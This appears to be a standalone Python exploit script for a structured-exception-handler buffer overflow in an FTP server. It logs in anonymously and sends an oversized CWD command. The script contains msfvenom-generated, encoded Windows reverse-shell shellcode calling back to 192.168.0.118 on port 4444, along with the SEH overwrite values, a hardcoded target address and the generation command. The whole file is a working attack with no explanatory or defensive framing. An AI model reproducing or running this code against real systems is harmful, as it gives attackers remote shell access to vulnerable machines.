#!/usr/bin/python
import socket
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2B"
#msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.0.118 LPORT=4444 -e x86/shikata_ga_nai -b "\x00\x0d\x0a\x3d\x5c\x2f" -i 3 -f python
buf =  ""
buf += "\xb8\x72\x3c\x65\x52\xdb\xd9\xd9\x74\x24\xf4\x5f\x33"
buf += "\xc9\xb1\x5f\x83\xef\xfc\x31\x47\x10\x03\x47\x10\x90"
buf += "\xc9\xde\xd7\xd8\x71\x02\x01\x23\xac\x30\x95\x57\x11"
buf += "\x88\x1c\x26\xf6\xdb\xc0\x5d\x04\x42\xe8\xde\xe4\x86"
buf += "\xf0\x90\xc9\x39\xb2\xb2\xda\x4d\x73\xf9\x6a\x5a\x28"
buf += "\x4e\xc6\xc3\xc5\xa1\x4b\x82\xc1\xd7\x6d\xe0\x01\xab"
buf += "\x64\x16\x51\xa7\x14\x1e\xb1\x33\xe4\x85\x74\x5a\x8f"
buf += "\x4d\x62\x4b\x07\x48\x24\x26\xfe\xcf\x84\x77\x86\x8c"
buf += "\x60\x71\xcf\x41\x6c\x11\xde\x89\x8e\x62\x59\x07\x55"
buf += "\xe0\x68\x7c\x88\x14\x14\xae\x5e\x5e\xcc\x0e\xc8\xae"
buf += "\x18\xc1\xc7\xeb\x76\x0e\x5d\x40\xdf\x9e\x64\x94\xa9"
buf += "\x94\x93\xb4\x5b\x62\x04\x1a\x0b\x48\x92\xf5\xb9\xef"
buf += "\x73\x85\xa4\xbd\x83\x95\x36\x73\x3c\x12\x7f\xb7\x1e"
buf += "\xc6\x2d\x08\xde\x88\x95\x82\xf7\xb2\x11\xc8\xdb\x68"
buf += "\x25\x07\xe5\xf9\x5d\xf4\x82\x3f\x06\x7c\x66\xb3\x71"
buf += "\xc6\x1f\xc5\x6c\x85\x13\x51\xde\xad\x6b\x6a\x52\x37"
buf += "\xd3\xa0\x21\x8a\x09\x7e\xe5\xba\xb3\x0f\xfc\x43\x64"
buf += "\x75\x9e\x63\xc5\x79\x82\x22\x89\xb3\x01\x8c\xb9\xac"
buf += "\xc3\xb2\x16\x84\x08\x90\x06\xd0\xf1\x15\x34\x72\x98"
buf += "\xfa\xef\x3a\xd1\xf4\xf4\x8c\xf1\xd9\xd9\xdc\x13\x59"
buf += "\x59\xcc\xb0\xda\xb6\x77\xbf\xcd\xd6\x6a\x52\xde\xa5"
buf += "\x54\xcb\xe8\xa6\x17\x9d\x53\x9a\x33\x29\xf6\xf2\xe1"
buf += "\xb7\x24\xe0\x85\xdd\x6d\x6f\xf6\x33\x90\xd0\x6b\x3f"
buf += "\xbb\xf2\x32\xc4\xcb\x11\xb9\x78\xda\x79\x50\x87\x87"
buf += "\xe8\x57\xc4\x84\xf7\x39\x77\x76\x07\x7c\xb5\x63\xa2"
buf += "\x88\xbd\x1c\x01\xb7\xd0\x06\x56\x36\xa8\xf2\xf4\x59"
buf += "\x49\xd1\x1e\x40\x04\x39\xe6\x05\x75\x42\x9d\xb6\x51"
buf += "\x58\x55\x9b\x64\xed\xfc\x3a\x02\x5a\xc7\xbb\x9d\x07"
buf += "\x0b\x69\xa6\x97\xad\x6f\xf3\x15\x7d\xe8\xc3\x7a\xec"
buf += "\x0e\x95\xc4\x5f\xd2\x05\x60\x0f\xfb\xe0\xaa\xdd\x39"
buf += "\x46\xeb\x71\x0f\x4e\x63\xe2\xde\x16\x82\x8a\x4e\x70"
buf += "\x59\xe0"

#nSEH = "\xEB\x13\x90\x90"
#SEH = "\x9D\x6D\x20\x12" >> 12206D9D
buffer = "\x41" * 1037 + "\xeb\x0a\x90\x90" + "\x9D\x6D\x20\x12" + "\x90" *30 +  buf +  "D"*1955
#buffer = "\x41" * 1060
print "\sending evil buffer...."
s.connect(('172.16.73.131',21)) #HARDCODED IP ADDRESS.
data = s.recv(1024)
s.send('USER anonymous' + '\r\n')
data = s.recv(1024)
s.send('PASS anonymous' + '\r\n')
data = s.recv(1024)
s.send('CWD ' +buffer+'\r\n')
s.close